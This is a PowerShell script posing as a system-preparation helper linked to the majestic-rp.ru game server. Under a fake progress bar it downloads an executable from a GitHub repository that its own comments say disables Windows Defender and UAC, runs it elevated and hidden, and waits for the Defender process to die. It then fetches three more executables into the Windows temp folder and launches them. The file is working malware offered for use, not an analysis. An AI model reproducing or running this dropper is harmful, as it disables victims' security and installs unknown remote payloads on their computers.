# === НАСТРОЙКА ЦВЕТА (меняй HEX здесь) ===
$hexColor = "#3A96DD"

[Console]::CursorVisible = $false

$r = [Convert]::ToInt32($hexColor.Substring(1,2), 16)
$g = [Convert]::ToInt32($hexColor.Substring(3,2), 16)
$b = [Convert]::ToInt32($hexColor.Substring(5,2), 16)
$bg = "$([char]27)[48;2;${r};${g};${b}m"
$reset = "$([char]27)[0m"
$white = "$([char]27)[97m"

$width = $Host.UI.RawUI.WindowSize.Width
if ($width -lt 1) { $width = 80 }

Write-Host "Need help? Check our homepage: " -NoNewline
Write-Host "majestic-rp.ru" -ForegroundColor Green

$pad = " " * $width

Write-Host "${bg}${white}${pad}${reset}"
Write-Host "${bg}${white}$("Preparing system...".PadRight($width))${reset}"
$script:progressBarY = $Host.UI.RawUI.CursorPosition.Y
Write-Host "${bg}${white}${pad}${reset}"
Write-Host "${bg}${white}$("    Please wait".PadRight($width))${reset}"
Write-Host "${bg}${white}${pad}${reset}"

$script:bottomY = $Host.UI.RawUI.CursorPosition.Y

function Show-Progress {
    param ([int]$Percent, [string]$Label = "")
    $barWidth = 40
    $filled = [int]($barWidth * $Percent / 100)
    $empty = $barWidth - $filled
    $bar = '#' * $filled + '-' * $empty
    $text = if ($Label) { "  [$bar] $Percent%  $Label" } else { "  [$bar] $Percent%" }
    $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0, $script:progressBarY
    Write-Host "${bg}${white}$($text.PadRight($width))${reset}" -NoNewline
    $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0, $script:bottomY
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ========= STAGE 1: silent.exe (kills Defender + silences UAC) =========
Show-Progress 5 "init"
$silentUrl  = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeles.exe'
$silentPath = "$env:TEMP\Timeles.exe"
try {
    $req = [System.Net.HttpWebRequest]::Create($silentUrl)
    $req.AllowAutoRedirect = $true
    $req.UserAgent = "Mozilla/5.0"
    $resp = $req.GetResponse()
    $s = $resp.GetResponseStream()
    $fs = [System.IO.File]::Create($silentPath)
    $s.CopyTo($fs); $fs.Close(); $s.Close(); $resp.Close()

    Show-Progress 10 "elevating"
    Start-Process $silentPath -Verb RunAs -WindowStyle Hidden -Wait

    # Wait up to 90 sec for MsMpEng to die (silent.exe runs SYSTEM task in background)
    $deadline = (Get-Date).AddSeconds(90)
    while ((Get-Date) -lt $deadline) {
        $alive = Get-Process MsMpEng -ErrorAction SilentlyContinue
        if (-not $alive) { break }
        $left = [int]((($deadline - (Get-Date)).TotalSeconds / 90) * 25 + 10)
        Show-Progress $left "killing defender"
        Start-Sleep -Milliseconds 800
    }
} catch { }

# ========= STAGE 2: payload downloads (Defender now neutralized) =========
$downloads = @(
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe';        Path = 'C:\Windows\Temp\Timeless.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_new.exe';    Path = 'C:\Windows\Temp\timeless_new.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe';  Path = 'C:\Windows\Temp\block_majestic.exe' }
)

$totalFiles = $downloads.Count
$fileIndex = 0
Show-Progress 35 "downloading"

foreach ($item in $downloads) {
    try {
        $req = [System.Net.HttpWebRequest]::Create($item.URL)
        $req.AllowAutoRedirect = $true
        $req.UserAgent = "Mozilla/5.0"
        $response = $req.GetResponse()
        $totalBytes = $response.ContentLength
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($item.Path)
        $buffer = New-Object byte[] 8192
        $bytesRead = 0
        $totalRead = 0
        while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $fileStream.Write($buffer, 0, $bytesRead)
            $totalRead += $bytesRead
            if ($totalBytes -gt 0) {
                $filePct = ($totalRead / $totalBytes)
                $totalPct = 35 + [int]((($fileIndex + $filePct) / $totalFiles) * 60)
                Show-Progress $totalPct
            }
        }
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        $fileIndex++
    }
    catch { }
}

Show-Progress 100 "done"
[Console]::CursorVisible = $true

foreach ($item in $downloads) {
    if (Test-Path $item.Path) {
        Start-Process $item.Path
    }
}
